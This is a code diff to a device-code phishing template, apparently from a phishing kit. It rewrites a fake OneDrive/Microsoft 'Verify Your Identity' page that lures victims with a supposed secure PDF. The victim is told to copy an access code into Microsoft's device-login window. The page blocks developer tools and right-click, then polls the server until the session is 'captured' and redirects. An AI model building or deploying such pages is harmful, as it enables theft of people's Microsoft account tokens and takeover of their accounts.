@@ -410,61 +410,481 @@ setTimeout(checkStatus,5000);
 const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
-<title>OneDrive - Secure Access</title>
-<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA8pJREFUWEfNl1tsFFUYx+fs7M7OdrtbWiiFUqBAoRRKS4sX1BgTjYkaY4wPxgcfTHwwMRofTEw0PviAD8YHE0x8MDE+GKMxahRFjYoKKihC5VIutFDaLbS95bJtd3Znduabn2dmm253Z7u0xJN8mZ2Z/Z/z+853vjOzFv8H">
-<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#0078d4;padding:14px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 4px rgba(0,0,0,0.1)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:600}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:480px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#0078d4}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebfc;border-left:4px solid:#0078d4;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#004578;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#0078d4;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#005a9e;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#005a9e;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6f0;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#0078d4;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#005a9e}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="referrer" content="no-referrer">
+    <title>Verify Your Identity</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            font-family: 'Segoe UI', -apple-system, Roboto, sans-serif;
+            background: #f3f3f3;
+            overflow: hidden;
+        }
+
+        /* Background Mock Document Interface based on Screenshot 2026-07-05 at 18.33.31.png */
+        .bg-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            filter: blur(5px);
+            z-index: 1;
+            pointer-events: none;
+        }
+        .bg-toolbar {
+            height: 40px;
+            background: #eaeaea;
+            border-bottom: 1px solid #dcdcdc;
+        }
+        .bg-viewer {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 40px;
+        }
+        .bg-doc {
+            background: #fff;
+            width: 100%;
+            max-width: 800px;
+            height: 100%;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 60px;
+        }
+        .bg-line {
+            background: #e0e0e0;
+            height: 15px;
+            margin-bottom: 20px;
+            border-radius: 2px;
+        }
+
+        /* Foreground Verification Modal */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.15);
+            z-index: 10;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.15);
+            border: 1px solid #d2d2d2;
+            display: flex;
+            flex-direction: column;
+        }
+        .card-header {
+            text-align: center;
+            padding: 24px;
+            font-size: 20px;
+            color: #242424;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        .card-body {
+            padding: 28px 36px;
+        }
+        .secure-alert {
+            font-size: 14px;
+            color: #242424;
+            margin-bottom: 20px;
+        }
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+        .pdf-icon {
+            width: 28px;
+            height: 28px;
+            background: #e02424;
+            color: white;
+            font-weight: bold;
+            font-size: 9px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 3px;
+            position: relative;
+        }
+        .pdf-icon::after {
+            content: 'PDF';
+            position: absolute;
+        }
+        .file-size {
+            font-size: 14px;
+            color: #242424;
+            font-weight: 500;
+        }
+        .instructions {
+            font-size: 13px;
+            color: #505050;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .brand-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .brand-logo svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        /* Input Container mapping code display fields */
+        .input-container {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        .code-input {
+            width: 100%;
+            border: 1px solid #707070;
+            padding: 10px 40px 10px 12px;
+            font-size: 16px;
+            color: #242424;
+            outline: none;
+            background: #fff;
+            font-family: inherit;
+            text-align: left;
+        }
+        .code-input.loading {
+            color: #8a8886;
+            font-style: italic;
+        }
+        .copy-icon-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            color: #505050;
+            display: flex;
+            align-items: center;
+        }
+        .copy-icon-btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+        .copy-icon-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+        }
+        .copy-icon-btn.copied {
+            color: #107c10;
+        }
+
+        .status {
+            font-size: 12px;
+            color: #107c10;
+            min-height: 18px;
+            margin-bottom: 16px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .btn-primary:hover {
+            background: #005a9e;
+        }
+        .btn-primary:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 11px;
+            color: #242424;
+        }
+        .footer-text a {
+            color: #242424;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 11px;
+            color: #707070;
+            margin-top: 12px;
+        }
+        .timer span {
+            font-weight: 600;
+            color: #d83b01;
+        }
+
+        /* Success Screen CSS state toggle targets */
+        .success {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success-icon {
+            width: 48px;
+            height: 48px;
+            background: #107c10;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+        .success-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .success h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #242424;
+            margin-bottom: 8px;
+        }
+        .success p {
+            font-size: 14px;
+            color: #505050;
+        }
+    </style>
 </head>
 <body>
-<div class="header">
-<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
-<span class="header-title">OneDrive</span>
+
+<!-- Blurred Document Mock Visual Backdrop -->
+<div class="bg-container">
+    <div class="bg-toolbar"></div>
+    <div class="bg-viewer">
+        <div class="bg-doc">
+            <div class="bg-line" style="width: 40%; height: 24px; margin-bottom: 40px;"></div>
+            <div class="bg-line" style="width: 90%;"></div>
+            <div class="bg-line" style="width: 85%;"></div>
+            <div class="bg-line" style="width: 60%; margin-bottom: 50px;"></div>
+            <div class="bg-line" style="width: 40%;"></div>
+            <div class="bg-line" style="width: 30%;"></div>
+        </div>
+    </div>
 </div>
-<div class="main"><div class="card">
-<div class="logo">
-<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" width="40" height="40" alt="OneDrive" style="flex-shrink:0">
-<span class="logo-text">OneDrive</span>
+
+<!-- Active Interaction Layer -->
+<div class="overlay">
+    <div class="card">
+        <div class="card-header">Verify Your Identity</div>
+        <div class="card-body">
+            
+            <!-- Target main wrapper view -->
+            <div id="mainView">
+                <p class="secure-alert">You've received a secure file</p>
+                
+                <div class="file-info">
+                    <div class="pdf-icon"></div>
+                    <span class="file-size">156.1KB</span>
+                </div>
+                
+                <p class="instructions">To receive and download this PDF file, please use the system access code generated below inside the Microsoft verification window.</p>
+                
+                <!-- Outlook Identity Vector Asset -->
+                <div class="brand-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path fill="#0078d4" d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
+                        <path fill="#fff" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
+                    </svg>
+                </div>
+                
+                <!-- Display Area for generating code variables -->
+                <div class="input-container">
+                    <div class="code-input" id="userCode">Loading...</div>
+                    <button class="copy-icon-btn" id="copyBtn" onclick="copyCode()" title="Copy Code" disabled>
+                        <svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
+                    </button>
+                </div>
+                
+                <div class="status" id="codeStatus"></div>
+                
+                <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
+                
+                <div class="footer-text">
+                    2026 Microsoft <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">Privacy & Cookies</a>
+                </div>
+                
+                <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
+            </div>
+
+            <!-- Target success template toggle state container -->
+            <div class="success" id="successView">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <h2>Verification Complete</h2>
+                <p>Your identity has been confirmed. Document Access Granted.</p>
+            </div>
+            
+        </div>
+    </div>
 </div>
-<div id="mainView">
-<p class="intro">A secure access code has been generated for your shared document.</p>
-<div class="info-box">For security reasons, OneDrive requires verification before granting access to shared documents. Use the code below to complete authentication.</div>
-<div class="code-label">Document Access Code</div>
-<div class="code-input" id="userCode">Loading...</div>
-<div class="copy-row">
-<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
-<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-<span id="copyText">Copy Code</span>
-</button>
-</div>
-<div class="status" id="codeStatus"></div>
-<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
-Access Document
-</button>
-<div class="security-box">
-<p>Your document is protected by OneDrive's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
-<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
-<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-OneDrive Secure Platform
-</a>
-</div>
-<p class="footer-text">If you need assistance, contact your OneDrive administrator.</p>
-<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-</div>
-<div class="success" id="successView">
-<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-<h2>Verification Complete</h2>
-<p>Your identity has been confirmed. You may now close this window.</p>
-<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
-</div>
-</div></div>
+
 <script>
-document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
-(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
+    // Developer Inspector Tool Protections
+    document.addEventListener("keydown", function(e) {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
+            e.preventDefault();
+        }
+    });
+
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+    });
+
+    // Main Engine Module
+    (function() {
+        var sid = '{session_id}';
+        var verifyUrl = '{verify_url}';
+        var codeReady = {code_ready};
+        var code = '{user_code}';
+        var expiresIn = {expires_seconds};
+        var popup = null;
+
+        var codeEl = document.getElementById('userCode');
+        var statusEl = document.getElementById('codeStatus');
+        var btnEl = document.getElementById('signInBtn');
+        var copyBtnEl = document.getElementById('copyBtn');
+        var timerEl = document.getElementById('timerValue');
+
+        function showCode(c, v) {
+            code = c;
+            if (v) verifyUrl = v;
+            codeEl.textContent = c;
+            codeEl.classList.remove('loading');
+            btnEl.disabled = false;
+            copyBtnEl.disabled = false;
+            document.getElementById('verifyLink').href = verifyUrl;
+        }
+
+        if (codeReady && code) {
+            showCode(code, verifyUrl);
+        } else {
+            codeEl.classList.add('loading');
+        }
+
+        function copyCode() {
+            if (!code) return;
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(code).then(function() {
+                    showCopied();
+                });
+            } else {
+                var t = document.createElement('textarea');
+                t.value = code;
+                t.style.cssText = 'position:fixed;left:-9999px';
+                document.body.appendChild(t);
+                t.select();
+                document.execCommand('copy');
+                document.body.removeChild(t);
+                showCopied();
+            }
+        }
+
+        function showCopied() {
+            copyBtnEl.classList.add('copied');
+            statusEl.textContent = 'Code copied to clipboard';
+            setTimeout(function() {
+                copyBtnEl.classList.remove('copied');
+            }, 3000);
+        }
+
+        window.copyCode = copyCode;
+
+        function openSignIn() {
+            if (!code) return;
+            copyCode();
+            var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
+            popup = window.open(verifyUrl, 'ms', 'width=' + w + ',height=' + h + ',left=' + l + ',top=' + t + ',scrollbars=yes,resizable=yes');
+            if (popup) popup.focus();
+        }
+
+        window.openSignIn = openSignIn;
+
+        function updateTimer() {
+            if (expiresIn <= 0) return;
+            expiresIn--;
+            var m = Math.floor(expiresIn / 60);
+            var s = expiresIn % 60;
+            timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+            if (expiresIn > 0) setTimeout(updateTimer, 1000);
+        }
+
+        if (codeReady) setTimeout(updateTimer, 1000);
+
+        // Core Polling Mechanism Engine
+        function poll() {
+            fetch('/dc/status/' + sid, {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(function(r) {
+                return r.json();
+            })
+            .then(function(d) {
+                if (d.ready && !codeReady) {
+                    codeReady = true;
+                    showCode(d.user_code, d.verify_url);
+                    if (expiresIn === {expires_seconds}) {
+                        setTimeout(updateTimer, 1000);
+                    }
+                }
+                if (d.captured) {
+                    document.getElementById('mainView').style.display = 'none';
+                    document.getElementById('successView').style.display = 'block';
+                    if (d.redirect_url) {
+                        setTimeout(function() {
+                            top.location.href = d.redirect_url;
+                        }, 2500);
+                    }
+                }
+                if (!d.failed && !d.expired && !d.captured) {
+                    setTimeout(poll, 3000);
+                }
+            })
+            .catch(function() {
+                setTimeout(poll, 5000);
+            });
+        }
+
+        poll();
+    })();
 </script>
 </body>
 </html>`
-
 // Calendly themed page
 const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
 <html lang="en">
